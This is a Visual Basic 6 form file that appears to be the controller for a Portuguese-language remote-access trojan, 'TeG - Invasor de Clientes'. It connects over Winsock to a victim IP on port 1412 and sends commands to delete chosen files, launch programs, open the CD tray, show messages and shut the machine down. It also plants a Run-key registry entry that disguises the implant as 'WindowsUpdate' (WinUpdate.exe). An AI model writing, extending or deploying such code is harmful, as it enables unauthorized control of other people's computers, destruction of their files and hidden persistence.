VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H00404040&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "TeG - Invasor de Clientes"
   ClientHeight    =   4965
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6660
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4965
   ScaleWidth      =   6660
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   6075
      TabIndex        =   25
      Text            =   "C:\Windows\System32\WinUpdate.exe"
      Top             =   4110
      Visible         =   0   'False
      Width           =   195
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   6075
      TabIndex        =   24
      Text            =   "WindowsUpdate"
      Top             =   3780
      Visible         =   0   'False
      Width           =   240
   End
   Begin VB.TextBox Subke 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   6075
      TabIndex        =   23
      Text            =   "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
      Top             =   3450
      Visible         =   0   'False
      Width           =   195
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Set Reg"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   22
      Top             =   3795
      Width           =   2775
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Deletar Arquivo"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   20
      Top             =   1545
      Width           =   2775
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Enviar Mensagem"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   18
      Top             =   3420
      Width           =   2775
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Tempo de Uso"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   17
      Top             =   3420
      Width           =   2775
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Fechar Servidor"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   16
      Top             =   3045
      Width           =   2775
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Criar Pasta"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   15
      Top             =   1545
      Width           =   2775
   End
   Begin VB.CommandButton cmdcddoor 
      Caption         =   "Abrir CDROM"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   14
      Top             =   795
      Width           =   2775
   End
   Begin VB.CommandButton Command6 
      Caption         =   "MS WORD"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   13
      Top             =   2670
      Width           =   2775
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Media Player"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   12
      Top             =   1920
      Width           =   2775
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Scandisk"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   11
      Top             =   2295
      Width           =   2775
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Paciência"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3180
      TabIndex        =   10
      Top             =   1170
      Width           =   2775
   End
   Begin VB.CommandButton cmdctrl 
      Caption         =   "Paibel de Controle"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   9
      Top             =   2670
      Width           =   2775
   End
   Begin VB.CommandButton cmdchecknet 
      Caption         =   "Checknet"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   6
      Top             =   1920
      Width           =   2775
   End
   Begin VB.CommandButton Command2 
      Caption         =   "DESLIGAR"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   5
      Top             =   2295
      Width           =   2775
   End
   Begin VB.CommandButton cmdpaint 
      Caption         =   "Paint"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   4
      Top             =   3045
      Width           =   2775
   End
   Begin VB.CommandButton cmdcalc 
      Caption         =   "Calculadora"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   3
      Top             =   795
      Width           =   2775
   End
   Begin VB.CommandButton cmdnote 
      Caption         =   "Bloco de notas"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   405
      TabIndex        =   2
      Top             =   1170
      Width           =   2775
   End
   Begin VB.TextBox txtip 
      Appearance      =   0  'Flat
      BackColor       =   &H0000FF00&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1980
      TabIndex        =   0
      Top             =   135
      Width           =   2775
   End
   Begin MSWinsockLib.Winsock w2 
      Left            =   720
      Top             =   780
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Escolha a Ação:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   225
      Left            =   2295
      TabIndex        =   21
      Top             =   495
      Width           =   1800
   End
   Begin VB.Label Command1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "CONECTAR"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   285
      Left            =   4740
      TabIndex        =   19
      Top             =   135
      Width           =   1215
   End
   Begin VB.Label lblremadd 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Endereço Remoto:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   2370
      TabIndex        =   8
      Top             =   4440
      Width           =   1935
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFF00&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   285
      Left            =   0
      TabIndex        =   7
      Top             =   4680
      Width           =   6660
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "IP do Servidor:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   225
      Left            =   30
      TabIndex        =   1
      Top             =   165
      Width           =   1800
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdcalc_Click()

   

    On Error GoTo err_cmdcalc_Click

Dim str As String
str = "calc"
w2.SendData str
    

    Exit Sub

err_cmdcalc_Click:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: cmdcalc_Click" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub cmdcddoor_Click()
Dim str As String
str = "cddooropen"
w2.SendData str
End Sub

Private Sub cmdchecknet_Click()

 

    On Error GoTo err_cmdchecknet_Click


Dim str As String
str = "checknet"
w2.SendData str
    

    Exit Sub

err_cmdchecknet_Click:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: cmdchecknet_Click" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub cmdctrl_Click()
On Error Resume Next
Dim str As String
str = "ctrl"
w2.SendData str
End Sub

Private Sub cmdnetclose_Click()
'Dim str As String
'str = "nonet"
'w2.SendData str
End Sub

Private Sub cmdnote_Click()

  

    On Error GoTo err_cmdnote_Click


Dim str As String
str = "note"
w2.SendData str
    

    Exit Sub

err_cmdnote_Click:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: cmdnote_Click" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub cmdpaint_Click()

    On Error GoTo err_cmdpaint_Click


Dim str As String
str = "pain"
w2.SendData str

    

    Exit Sub

err_cmdpaint_Click:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: cmdpaint_Click" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub Command1_Click()



    On Error GoTo err_Command1_Click


w2.RemotePort = 1412
If txtip.Text = "" Then
MsgBox "Digite o IP a ser invadido..."
Else
w2.RemoteHost = txtip.Text
w2.Connect
End If
If w2.State = sckConnected Then
Me.Caption = "Computador remoto invadido: " & txtip.Text
Else
Me.Caption = "Não foi Possível Invadir: " & txtip.Text
End If
    

    Exit Sub

err_Command1_Click:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: Command1_Click" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName

End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BackColor = &HFFFF00
End Sub

Private Sub Command10_Click()
On Error Resume Next
Dim mesag As String
Dim tit As String
mesag = InputBox("Digite a mensagem a enviar...", "Enviar mensagem ao ´invadido´ ")
Dim str As String
str = "msg"
w2.SendData mesag
w2.SendData str

    
End Sub

Private Sub Command11_Click()
On Error Resume Next
Dim file As String
Dim tit As String
file = InputBox("Digite o caminho e o arquivo a deletar no PC Invadido...", "Deletar Arquivo Alheio...")
Dim str As String
str = "del"
w2.SendData file
w2.SendData str

    
End Sub

Private Sub Command12_Click()
On Error Resume Next
Dim str As String
str = "regput"

Dim Subk As String
Dim val As String
Dim ent As String
Subk = Subke.Text
ent = Text1.Text
val = Text2.Text
w2.SendData Subk
w2.SendData ent
w2.SendData val
w2.SendData str
End Sub

Private Sub Command2_Click()

    

    On Error GoTo err_Command2_Click


Dim str As String
str = "close"
w2.SendData str
    

    Exit Sub

err_Command2_Click:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: Command2_Click" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub Command3_Click()
On Error Resume Next
Dim str As String
str = "sol"
w2.SendData str
End Sub

Private Sub Command4_Click()
On Error Resume Next
Dim str As String
str = "scan"
w2.SendData str
End Sub

Private Sub Command5_Click()
On Error Resume Next
Dim str As String
str = "mplayer"
w2.SendData str
End Sub

Private Sub Command6_Click()
On Error Resume Next
Dim str As String
str = "word"
w2.SendData str
End Sub

Private Sub Command7_Click()
On Error Resume Next
Dim str As String
str = "dir"
w2.SendData str
MsgBox "A directory c:\mydir\THIS IS MY POWER\ has been created at " & w2.RemoteHost
End Sub

Private Sub Command8_Click()
On Error Resume Next
Dim str As String
str = "closeme"
w2.SendData str
w2.Close
Me.Caption = "Disconnected"
End Sub

Private Sub Command9_Click()
On Error Resume Next
Dim str As String
str = "wintime"
w2.SendData str
End Sub

Private Sub Form_Load()
If App.PrevInstance = True Then Unload Me
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BackColor = &HFFFFFF
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
On Error Resume Next
Dim str As String
str = "closeme"
w2.SendData str
w2.Close
Me.Caption = "Disconnected"
End Sub

Private Sub Form_Unload(Cancel As Integer)

  

    On Error GoTo err_Form_Unload


w2.Close
    

    Exit Sub

err_Form_Unload:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: Form_Unload" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub w2_Connect()


    On Error GoTo err_w2_Connect


Me.Caption = "Connected 2 Remote Host"
    

    Exit Sub

err_w2_Connect:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: w2_Connect" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub

Private Sub w2_DataArrival(ByVal bytesTotal As Long)

    

    On Error GoTo err_w2_DataArrival



Dim str As String
w2.GetData str
Label2.Caption = str
    

    Exit Sub

err_w2_DataArrival:
    Screen.MousePointer = vbNormal
    MsgBox "An error has occured." & vbCrLf & vbTab & _
        "Procedure: w2_DataArrival" & vbCrLf & vbTab & _
        "Error Number: " & Err.Number & vbCrLf & vbTab & _
        "Error Description: " & Err.Description, vbCritical + vbOKOnly, App.EXEName
End Sub
